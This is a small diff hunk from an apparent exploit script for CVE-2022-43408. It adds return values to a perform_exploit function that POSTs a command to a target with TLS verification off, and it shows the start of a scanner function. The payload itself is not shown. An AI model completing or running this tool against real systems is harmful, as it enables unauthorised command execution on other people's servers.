@@ -76,8 +76,10 @@ def perform_exploit(session, profile_url, command):
     try:
         response = session.post(exploit_url, headers=header, data=body, verify=False)
         print(f"{Style.BRIGHT}{Fore.GREEN}[+] Exploit response: \n{response.text}")
+        return True
     except Exception as e:
         print(f"{Style.BRIGHT}{Fore.RED}[-] Error during exploit: {e}")
+        return
 
 def scan_cve_2022_43408(profile_url):
 
